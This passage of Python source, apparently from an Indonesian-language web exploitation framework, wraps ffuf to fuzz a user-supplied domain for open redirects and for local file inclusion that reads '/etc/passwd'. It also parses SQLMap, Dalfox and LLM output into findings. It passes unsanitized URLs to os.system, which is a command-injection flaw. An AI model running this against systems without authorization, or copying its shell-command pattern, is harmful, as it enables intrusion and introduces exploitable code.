                    print(f"\n{self.colors.GREEN}Hasil XSS yang ditemukan:{self.colors.NC}")
                    for i, xss_item in enumerate(xss_results, 1):
                        print(f"{i}. {xss_item}")
                    
                    while True:
                        try:
                            choice = int(input("Pilih nomor hasil XSS untuk detail (atau 0 untuk keluar): ")) - 1
                            if choice == -1:
                                break
                            elif 0 <= choice < len(xss_results):
                                print(f"\n{self.colors.GREEN}Detail hasil:{self.colors.NC}")
                                print(xss_results[choice])
                                print(f"\n{self.colors.YELLOW}Salin payload atau lakukan tindakan lanjutan sesuai kebutuhan.{self.colors.NC}")
                                break
                            else:
                                print(f"{self.colors.RED}Pilihan tidak valid.{self.colors.NC}")
                        except ValueError:
                            print(f"{self.colors.RED}Masukkan angka yang valid.{self.colors.NC}")
                else:
                    print(f"{self.colors.YELLOW}Tidak ditemukan hasil XSS pada target ini.{self.colors.NC}")

    def redirect_ffuf_menu(self):
        """Menu PoC Open Redirect dengan ffuf"""
        print(f"\n{self.colors.GREEN}=== FFUF (Open Redirect) ==={self.colors.NC}")
        domain = input("Masukkan domain target: ").strip()
        if not self.helpers.is_valid_domain(domain):
            print(f"{self.colors.RED}Domain tidak valid!{self.colors.NC}")
            return
        gf_out = self.helpers.get_gf_candidates_path('redirect', domain)
        if not os.path.exists(gf_out) or os.path.getsize(gf_out) == 0:
            print(f"{self.colors.RED}File kandidat redirect hasil GF tidak ditemukan di: {gf_out}{self.colors.NC}")
            print(f"{self.colors.YELLOW}Silakan jalankan dulu tahap Scanning & Enumeration (menu 2) agar file kandidat tersedia.{self.colors.NC}")
            agree = input("Apakah Anda ingin langsung menjalankan Scanning & Enumeration sekarang? (y/n): ").strip().lower()
            if agree == 'y':
                from platform.modules.scan_and_enum import ScanningEnumeration
                scanner = ScanningEnumeration()
                scanner.run_scanning_enumeration_workflow(domain)
            return
        wordlist = "/usr/share/wordlists/redirect.txt"
        output_file = self.helpers.get_scan_output_path('redirect', domain)
        print(f"{self.colors.BLUE}Menjalankan ffuf pada kandidat redirect...{self.colors.NC}")
        with open(gf_out) as f:
            urls = [line.strip() for line in f if line.strip()]
        for url in urls:
            if 'FUZZ' not in url:
                print(f"{self.colors.YELLOW}[!] URL ini tidak mengandung FUZZ, dilewati: {url}{self.colors.NC}")
                continue
            cmd = f"ffuf -w {wordlist} -u '{url}' -fs 0 -o temp_ffuf_result.txt"
            print(f"{self.colors.YELLOW}[*] Command: {cmd}{self.colors.NC}")
            os.system(cmd)
            # Parsing hasil dengan grep (Location, http, 30x)
            os.system("grep -E 'Location:|http|30[1278]' temp_ffuf_result.txt > temp_ffuf_grep.txt")
            with open('temp_ffuf_grep.txt', 'r') as tempf, open(output_file, 'a') as outf:
                outf.write(f"\n=== Hasil ffuf (grep redirect) untuk URL: {url} ===\n")
                grep_content = tempf.read()
                outf.write(grep_content)
                print(f"{self.colors.GREEN}Hasil grep redirect:\n{grep_content}{self.colors.NC}")
        if os.path.exists('temp_ffuf_result.txt'):
            os.remove('temp_ffuf_result.txt')
        if os.path.exists('temp_ffuf_grep.txt'):
            os.remove('temp_ffuf_grep.txt')
        print(f"{self.colors.GREEN}[+] Hasil ffuf disimpan di: {output_file}{self.colors.NC}")
        # Tambahkan analisis LLM otomatis
        try:
            with open(output_file, 'r') as f:
                redirect_content = f.read()
            if redirect_content.strip():
                print(f"\n{self.colors.BLUE}=== Memulai Analisis Otomatis dengan LLM (Open Redirect) ==={self.colors.NC}")
                llm_file = self.analyze_with_llm_and_save(redirect_content, 'redirect', domain, auto_push=False)
                if llm_file:
                    print(f"{self.colors.GREEN}[+] File analisis LLM tersedia untuk reporting: {llm_file}{self.colors.NC}")
        except Exception as e:
            print(f"{self.colors.RED}[!] Gagal melakukan analisis LLM untuk redirect: {e}{self.colors.NC}")

    def lfi_ffuf_menu(self):
        """Menu PoC LFI dengan ffuf"""
        print(f"\n{self.colors.GREEN}=== FFUF (LFI) ==={self.colors.NC}")
        domain = input("Masukkan domain target: ").strip()
        if not self.helpers.is_valid_domain(domain):
            print(f"{self.colors.RED}Domain tidak valid!{self.colors.NC}")
            return
        gf_out = self.helpers.get_gf_candidates_path('lfi', domain)
        if not os.path.exists(gf_out) or os.path.getsize(gf_out) == 0:
            print(f"{self.colors.RED}File kandidat LFI hasil GF tidak ditemukan di: {gf_out}{self.colors.NC}")
            print(f"{self.colors.YELLOW}Silakan jalankan dulu tahap Scanning & Enumeration (menu 2) agar file kandidat tersedia.{self.colors.NC}")
            agree = input("Apakah Anda ingin langsung menjalankan Scanning & Enumeration sekarang? (y/n): ").strip().lower()
            if agree == 'y':
                from platform.modules.scan_and_enum import ScanningEnumeration
                scanner = ScanningEnumeration()
                scanner.run_scanning_enumeration_workflow(domain)
            return
        wordlist = "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
        output_file = self.helpers.get_scan_output_path('lfi', domain)
        print(f"{self.colors.BLUE}Menjalankan ffuf pada kandidat LFI...{self.colors.NC}")
        with open(gf_out) as f:
            urls = [line.strip() for line in f if line.strip()]
        for url in urls:
            if 'FUZZ' not in url:
                print(f"{self.colors.YELLOW}[!] URL ini tidak mengandung FUZZ, dilewati: {url}{self.colors.NC}")
                continue
            cmd = f"ffuf -w {wordlist} -u '{url}' -fs 0 -o temp_ffuf_result.txt"
            print(f"{self.colors.YELLOW}[*] Command: {cmd}{self.colors.NC}")
            os.system(cmd)
            # Parsing hasil dengan grep (indikasi /etc/passwd)
            os.system("grep 'root:x:0:0:' temp_ffuf_result.txt > temp_ffuf_grep.txt")
            with open('temp_ffuf_grep.txt', 'r') as tempf, open(output_file, 'a') as outf:
                outf.write(f"\n=== Hasil ffuf (grep /etc/passwd) untuk URL: {url} ===\n")
                grep_content = tempf.read()
                outf.write(grep_content)
                print(f"{self.colors.GREEN}Hasil grep LFI (/etc/passwd):\n{grep_content}{self.colors.NC}")
        if os.path.exists('temp_ffuf_result.txt'):
            os.remove('temp_ffuf_result.txt')
        if os.path.exists('temp_ffuf_grep.txt'):
            os.remove('temp_ffuf_grep.txt')
        print(f"{self.colors.GREEN}[+] Hasil ffuf disimpan di: {output_file}{self.colors.NC}")
        # Tambahkan analisis LLM otomatis
        try:
            with open(output_file, 'r') as f:
                lfi_content = f.read()
            if lfi_content.strip():
                print(f"\n{self.colors.BLUE}=== Memulai Analisis Otomatis dengan LLM (LFI) ==={self.colors.NC}")
                llm_file = self.analyze_with_llm_and_save(lfi_content, 'lfi', domain, auto_push=False)
                if llm_file:
                    print(f"{self.colors.GREEN}[+] File analisis LLM tersedia untuk reporting: {llm_file}{self.colors.NC}")
        except Exception as e:
            print(f"{self.colors.RED}[!] Gagal melakukan analisis LLM untuk LFI: {e}{self.colors.NC}")


    def get_summary(self, domain):
        """Parse hasil exploitation dan analysis untuk mendapatkan summary"""
        import re
        findings = []
        
        # Cari file output dari berbagai tools exploitation
        domain_output_dir = self.helpers.get_domain_output_dir(domain)
        if not os.path.exists(domain_output_dir):
            return {'findings': [], 'summary': 'Tidak ada hasil exploitation'}
        
        # Cari file sqlmap
        sqlmap_files = []
        for file in os.listdir(domain_output_dir):
            if file.startswith('sqlmap_') and file.endswith('.txt'):
                sqlmap_files.append(os.path.join(domain_output_dir, file))
        
        # Cari file dalfox
        dalfox_files = []
        for file in os.listdir(domain_output_dir):
            if file.startswith('dalfox_') and file.endswith('.txt'):
                dalfox_files.append(os.path.join(domain_output_dir, file))
        

        
        # Cari file LLM analysis
        llm_files = []
        for file in os.listdir(domain_output_dir):
            if file.startswith('llm_') and file.endswith('.txt'):
                llm_files.append(os.path.join(domain_output_dir, file))
        
        # Parse SQLMap findings
        for sqlmap_file in sqlmap_files:
            try:
                with open(sqlmap_file, 'r') as f:
                    content = f.read()
                    lines = content.split('\n')
                    
                    for line in lines:
                        line_lower = line.lower()
                        if "parameter:" in line_lower and "vulnerable" in line_lower:
                            param_name = line.split(":")[-1].strip()
                            findings.append({
                                'type': 'SQL Injection',
                                'severity': 'High',
                                'description': f"Parameter '{param_name}' rentan terhadap SQL injection",
                                'tool': 'SQLMap',
                                'file': os.path.basename(sqlmap_file)
                            })
            except Exception as e:
                print(f"[DEBUG] Error parsing {sqlmap_file}: {str(e)}")
        
        # Parse Dalfox findings
        for dalfox_file in dalfox_files:
            try:
                with open(dalfox_file, 'r') as f:
                    content = f.read()
                    lines = content.split('\n')
                    
                    for line in lines:
                        line_lower = line.lower()
                        if "xss" in line_lower and ("found" in line_lower or "vulnerable" in line_lower):
                            findings.append({
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'High',
                                'description': f"XSS vulnerability ditemukan: {line.strip()}",
                                'tool': 'Dalfox',
                                'file': os.path.basename(dalfox_file)
                            })
            except Exception as e:
                print(f"[DEBUG] Error parsing {dalfox_file}: {str(e)}")
        
        # Parse LLM analysis findings (hanya SQLMap dan Dalfox, tidak ada backdoor)
        for llm_file in llm_files:
            try:
                filename = os.path.basename(llm_file)
                # Skip file backdoor
                if 'backdoor' in filename.lower():
                    continue
                    
                with open(llm_file, 'r') as f:
                    content = f.read()
                    # Cari ringkasan dari LLM
                    ringkasan_match = re.search(r"\*\*Ringkasan Eksploitasi\*\*\n(.+?)(\n\*\*|\n- |\n\n)", content, re.DOTALL)
                    if ringkasan_match:
                        findings.append({
                            'type': 'LLM Analysis',
                            'severity': 'High',
                            'description': ringkasan_match.group(1).strip(),
                            'tool': 'LLM Analysis',
                            'file': os.path.basename(llm_file)
                        })
            except Exception as e:
                print(f"[DEBUG] Error parsing {llm_file}: {str(e)}")
        
        # DEBUG: print hasil parsing
        print(f"[DEBUG] Exploitation findings: {len(findings)}")
        
        return {
            'findings': findings,
            'summary': f"Ditemukan {len(findings)} temuan dari exploitation dan analysis"
        }